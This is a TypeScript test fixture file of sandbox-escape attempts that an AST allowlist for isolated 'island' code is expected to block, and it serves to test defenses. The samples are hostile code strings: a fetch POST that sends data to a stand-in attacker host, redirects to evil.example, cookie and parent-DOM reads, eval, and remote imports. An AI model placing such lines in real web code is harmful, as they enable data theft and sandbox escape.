/**
 * adversarial.ts — injection/escape attempts the AST allowlist MUST block (host-side layer).
 *
 * Each fixture is a distinct escape the jailed-eval island must refuse before the code ever
 * reaches the frame. These are the AST-detectable escapes; purely runtime/CSP-layer escapes
 * (document.write of a script, nested-iframe-without-CSP) are covered by the Playwright
 * browser-isolation spec (see 20-RESEARCH.md §5), not this AST layer.
 */

import type { IslandViolationRule } from "../validate-island-code";

export interface AdversarialFixture {
  readonly name: string;
  readonly code: string;
  /** The allowlist rule that must fire. */
  readonly expectedRule: IslandViolationRule;
}

export const ADVERSARIAL_FIXTURES: readonly AdversarialFixture[] = [
  { name: "parent-dom-read", code: "const b = window.parent.document.body;", expectedRule: "host-access" },
  { name: "bare-parent-nav", code: "parent.location = 'https://evil.example';", expectedRule: "host-access" },
  { name: "top-navigation", code: "top.location.href = 'https://evil.example';", expectedRule: "host-access" },
  { name: "opener-access", code: "const w = opener;", expectedRule: "host-access" },
  { name: "cookie-read", code: "const c = document.cookie;", expectedRule: "storage" },
  { name: "localstorage-write", code: "localStorage.setItem('x', '1');", expectedRule: "storage" },
  { name: "indexeddb", code: "const db = indexedDB;", expectedRule: "storage" },
  { name: "fetch-exfil", code: "fetch('https://evil.example', { method: 'POST', body: document.title });", expectedRule: "network" },
  { name: "xhr", code: "const r = new XMLHttpRequest();", expectedRule: "network" },
  { name: "websocket", code: "const s = new WebSocket('wss://evil.example');", expectedRule: "network" },
  { name: "eventsource", code: "const e = new EventSource('https://evil.example');", expectedRule: "network" },
  { name: "sendbeacon", code: "navigator.sendBeacon('https://evil.example', 'x');", expectedRule: "network" },
  { name: "window-fetch", code: "window.fetch('https://evil.example');", expectedRule: "network" },
  { name: "eval", code: "eval('2 + 2');", expectedRule: "dynamic-eval" },
  { name: "function-constructor", code: "const f = new Function('return 1');", expectedRule: "dynamic-eval" },
  { name: "static-import", code: "import secret from 'https://evil.example/x.js';", expectedRule: "import" },
  { name: "dynamic-import", code: "import('https://evil.example/x.js');", expectedRule: "import" },
  { name: "require", code: "const fs = require('fs');", expectedRule: "require" },
];
